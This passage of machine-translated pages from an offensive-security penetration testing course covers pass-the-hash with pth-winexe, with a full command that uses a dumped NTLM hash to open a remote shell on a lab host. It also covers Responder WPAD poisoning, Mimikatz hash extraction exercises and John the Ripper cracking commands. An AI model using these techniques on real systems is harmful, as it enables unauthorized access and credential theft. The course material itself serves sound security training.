<div style="position:absolute;top:176647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为该目标有一个具有相同用户名和密码的帐户。</font></font></nobr></div>
<div style="position:absolute;top:176679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们介绍一个场景来演示这种攻击。</font><font style="vertical-align: inherit;">在评估过程中，我们发现了一个</font></font></nobr></div>
<div style="position:absolute;top:176698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在多个系统上启用的本地管理帐户。</font><font style="vertical-align: inherit;">我们利用了一个漏洞</font></font></nobr></div>
<div style="position:absolute;top:176718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些系统之一并获得了 SYSTEM 权限，允许我们转储本地 LM 和 NTLM</font></font></nobr></div>
<div style="position:absolute;top:176737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希值。</font><font style="vertical-align: inherit;">我们已经复制了本地管理员 NTLM 哈希，现在可以使用它而不是</font></font></nobr></div>
<div style="position:absolute;top:176756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码以访问具有相同本地管理员帐户的另一台计算机</font></font></nobr></div>
<div style="position:absolute;top:176776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和密码。</font></font></nobr></div>
<div style="position:absolute;top:176809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们将使用</font><font style="vertical-align: inherit;">Passing-The-Hash 工具包中的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pth-winexe </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">579</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（修改版</font></font></nobr></div>
<div style="position:absolute;top:176828;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">winexe</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，它使用 SMB 协议执行身份验证：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:176863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pth-winexe</font></font></font></b></nobr></div>
<div style="position:absolute;top:176880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">winexe 1.1 版</font></font></nobr></div>
<div style="position:absolute;top:176897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该程序可以根据 GNU GPLv3 的条款自由重新分发</font></font></nobr></div>
<div style="position:absolute;top:176914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：winexe [OPTION]... //HOST COMMAND</font></font></nobr></div>
<div style="position:absolute;top:176931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:176948;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-h, --help    </font></font></nobr></div>
<div style="position:absolute;top:176948;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示帮助信息</font></font></nobr></div>
<div style="position:absolute;top:176965;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-V, --version    </font></font></nobr></div>
<div style="position:absolute;top:176965;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示版本号</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:177019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">577 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Foofus.Net，2008），http://foofus.net/goons/fizzgig/fgdump/downloads.htm</font></font></font></nobr></div>
<div style="position:absolute;top:177039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">578 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Amplia Security，2018 年），https://www.ampliasecurity.com/research/windows-credentials-editor/</font></font></font></nobr></div>
<div style="position:absolute;top:177059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">579 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(byt3bl33d3r, 2015), https://github.com/byt3bl33d3r/pth-toolkit</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:177187;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="150"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 150 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:177220;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:178297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:178297;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:178297;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">591</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:177316;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-U, --user=[DOMAIN/]USERNAME[%PASSWORD] 设置网络用户名</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:177332;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-A, --authentication-file=FILE    </font></font></nobr></div>
<div style="position:absolute;top:177332;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从文件中获取凭据</font></font></nobr></div>
<div style="position:absolute;top:177349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:177369;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 617 - 显示 pth-winexe 的帮助对话框</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:177427;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 SMB 在远程计算机上执行类似 cmd 的应用程序</font></font></i></nobr></div>
<div style="position:absolute;top:177447;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">协议，需要管理权限。</font><font style="vertical-align: inherit;">这是由于身份验证</font></font></i></nobr></div>
<div style="position:absolute;top:177466;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理共享 C$ 和 Windows 服务的后续创建。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:177528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为演示，我们将</font><font style="vertical-align: inherit;">在 Kali 机器上</font><font style="vertical-align: inherit;">调用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pth-winexe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来验证我们的目标</font></font></nobr></div>
<div style="position:absolute;top:177548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用先前转储的密码哈希。</font><font style="vertical-align: inherit;">我们将在目标上获得远程命令提示符</font></font></nobr></div>
<div style="position:absolute;top:177567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过指定用户名和哈希（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-U</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）以及 SMB 共享（以 UNC 格式）和</font></font></nobr></div>
<div style="position:absolute;top:177587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要执行的命令的名称，在清单 618 中为</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们将忽略</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DOMAIN</font></font></i></nobr></div>
<div style="position:absolute;top:177606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数，并将用户名（后跟一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">%</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">符号）添加到哈希以完成</font></font></nobr></div>
<div style="position:absolute;top:177625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">语法有点棘手，如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:177660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:177677;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eb3b9f05c425e //10.11.0.22 cmd</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:177694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用 E_md4hash 包装器。</font></font></nobr></div>
<div style="position:absolute;top:177711;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HASH PASS：替换用户提供的 NTLM HASH ...</font></font></nobr></div>
<div style="position:absolute;top:177728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.16299.309]</font></font></nobr></div>
<div style="position:absolute;top:177745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2017 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:177779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font></nobr></div>
<div style="position:absolute;top:177798;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 618 - 使用 pth-winexe 传递哈希</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:177827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据清单 618 中的输出，该命令成功，在目标上提供了一个 shell</font></font></nobr></div>
<div style="position:absolute;top:177847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用捕获的哈希作为凭据。</font></font></nobr></div>
<div style="position:absolute;top:177880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在幕后，我们提供的 NTLM 哈希格式被更改为 NetNTLM 版本</font></font></nobr></div>
<div style="position:absolute;top:177899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证过程中的</font><font style="vertical-align: inherit;">1 或 2 </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">580</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式。</font><font style="vertical-align: inherit;">我们可以使用 man-in-the- 捕获这些哈希值</font></font></nobr></div>
<div style="position:absolute;top:177918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中间或中毒攻击，然后破解它们</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">581</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或中继它们。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">582</font></font></font></nobr></div>
<div style="position:absolute;top:177951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，某些应用程序（如 Internet Explorer 和 Windows Defender）使用 Web 代理</font></font></nobr></div>
<div style="position:absolute;top:177971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动发现协议 (WPAD) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">583</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来检测代理设置。</font><font style="vertical-align: inherit;">如果我们在本地网络上，我们可以</font></font></nobr></div>
<div style="position:absolute;top:177990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">毒害这些请求，并强制使用类似的工具NetNTLM认证</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Responder.py</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">584</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:178009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建一个流氓 WPAD 服务器，旨在利用此安全问题。</font><font style="vertical-align: inherit;">由于中毒严重</font></font></nobr></div>
<div style="position:absolute;top:178029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对其他用户造成干扰，不应在实验室中使用 Responder.py 之类的工具。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:178153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">580 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/NT_LAN_Manager#NTLMv1</font></font></font></nobr></div>
<div style="position:absolute;top:178173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">581 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（罗伯·布朗，2018 年），https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html</font></font></font></nobr></div>
<div style="position:absolute;top:178193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">582 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(byt3bl33d3r, 2017), https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:178208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分钟.html</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:178227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">583 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol</font></font></font></nobr></div>
<div style="position:absolute;top:178247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">584 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（蜘蛛实验室，2019 年），https://github.com/SpiderLabs/Responder</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:178375;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="151"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 151 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:178408;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:179485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:179485;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:179485;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">592</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:178504;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.4.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:178534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 Mimikatz 从 Windows 中提取管理用户的密码哈希</font></font></nobr></div>
<div style="position:absolute;top:178553;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户。</font></font></nobr></div>
<div style="position:absolute;top:178582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 重用密码哈希从您的 Kali 系统执行传递哈希攻击，并</font></font></nobr></div>
<div style="position:absolute;top:178601;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在您的 Windows 客户端上获取代码执行。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:178635;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.4.3</font></font></i></nobr></div>
<div style="position:absolute;top:178635;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码破解</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:178673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在密码分析中，密码破解是恢复明文密码的过程，鉴于其</font></font></nobr></div>
<div style="position:absolute;top:178693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储的哈希。</font></font></nobr></div>
<div style="position:absolute;top:178726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码破解的过程在高层次上是相当简单的。</font><font style="vertical-align: inherit;">一旦我们有</font></font></nobr></div>
<div style="position:absolute;top:178745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现了我们在目标认证过程中处理的散列机制，我们</font></font></nobr></div>
<div style="position:absolute;top:178764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以遍历单词表中的每个单词并生成相应的消息摘要。</font><font style="vertical-align: inherit;">如果</font></font></nobr></div>
<div style="position:absolute;top:178784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计算出的哈希与从目标系统获得的哈希匹配，我们已经获得了匹配</font></font></nobr></div>
<div style="position:absolute;top:178803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">明文密码。</font><font style="vertical-align: inherit;">这通常都是在专用密码的帮助下完成的</font></font></nobr></div>
<div style="position:absolute;top:178822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">破解程序。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:178884;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果身份验证过程中涉及盐，而我们不知道那是什么</font></font></i></nobr></div>
<div style="position:absolute;top:178903;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">盐值是，裂解可能会变得非常复杂，如果不是不可能的话，因为我们</font></font></i></nobr></div>
<div style="position:absolute;top:178923;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必须用各种盐重复散列每个潜在的明文密码。</font></font></i></nobr></div>
<div style="position:absolute;top:178942;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管如此，根据我们的经验，我们几乎总是能够捕捉到</font></font></i></nobr></div>
<div style="position:absolute;top:178962;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码散列和盐，无论是来自包含两者的数据库</font></font></i></nobr></div>
<div style="position:absolute;top:178981;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每条记录的唯一值，或来自使用的配置或二进制文件</font></font></i></nobr></div>
<div style="position:absolute;top:179000;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有散列值的单一盐。</font><font style="vertical-align: inherit;">当两个值都已知时，密码</font></font></i></nobr></div>
<div style="position:absolute;top:179020;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">破解的复杂性降低。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:179082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们从目标系统获得了对密码哈希的访问权限，我们就可以开始输入密码</font></font></nobr></div>
<div style="position:absolute;top:179101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">破解会话，在后台运行，我们继续我们的评估。</font><font style="vertical-align: inherit;">如果其中任何一个</font></font></nobr></div>
<div style="position:absolute;top:179120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码被破解，我们可以尝试在其他系统上使用这些密码来增加</font></font></nobr></div>
<div style="position:absolute;top:179140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们对目标网络的控制。</font><font style="vertical-align: inherit;">与其他渗透测试过程一样，这是迭代和</font></font></nobr></div>
<div style="position:absolute;top:179159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着我们扩大控制范围，我们会将数据反馈到之前的步骤中。</font></font></nobr></div>
<div style="position:absolute;top:179192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了演示密码破解，我们将再次求助于开膛手约翰，因为它支持数十种密码</font></font></nobr></div>
<div style="position:absolute;top:179211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码格式，并且非常强大和灵活。</font></font></nobr></div>
<div style="position:absolute;top:179244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以纯蛮力模式</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">john</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（尝试在一个</font></font></nobr></div>
<div style="position:absolute;top:179263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码）就像在命令上传递包含我们的密码哈希的文件名一样简单</font></font></nobr></div>
<div style="position:absolute;top:179283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与散列格式一起行。</font></font></nobr></div>
<div style="position:absolute;top:179316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 619 中，我们攻击</font><font style="vertical-align: inherit;">使用 mimikatz 转储的</font><font style="vertical-align: inherit;">NT 哈希值 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--format=NT</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:179351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat hash.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:179368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WDAGUtilityAccount:0c509cca8bcd12a26acf0d1e508cb028</font></font></nobr></div>
<div style="position:absolute;top:179384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Offsec:2892d26cdf84d7a70e2eb3b9f05c425e</font></font></nobr></div>
<div style="position:absolute;top:179418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo john hash.txt --format=NT</font></font></font></b></nobr></div>
<div style="position:absolute;top:179436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用默认输入编码：UTF-8 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:179563;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="152"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 152 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:179596;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:180673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:180673;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:180673;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">593</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:179692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 ISO-8859-1 的规则/掩码</font></font></nobr></div>
<div style="position:absolute;top:179708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载了 2 个没有不同盐的密码哈希（NT [MD4 128/128 AVX 4x3]）</font></font></nobr></div>
<div style="position:absolute;top:179725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按 'q' 或 Ctrl-C 中止，几乎任何其他状态键</font></font></nobr></div>
<div style="position:absolute;top:179745;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 619 - 使用 John the Ripper 进行暴力破解</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:179774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上面的输出中，JTR 正确识别了哈希类型并着手破解它。</font><font style="vertical-align: inherit;">蛮力</font></font></nobr></div>
<div style="position:absolute;top:179794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，基于我们系统的速度，像这样的攻击需要很长时间。</font><font style="vertical-align: inherit;">作为</font></font></nobr></div>
<div style="position:absolute;top:179813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或者，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--wordlist</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数并提供指向单词列表的路径，</font></font></nobr></div>
<div style="position:absolute;top:179832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缩短处理时间，但承诺更少的密码覆盖：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:179868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT</font></font></font></b></nobr></div>
<div style="position:absolute;top:179886;left:303"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 620 - 使用 John the Ripper 破解字典</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:179916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果还有密码需要破解，我们接下来可以尝试应用 JTR 的单词重整规则</font></font></nobr></div>
<div style="position:absolute;top:179935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--rules</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
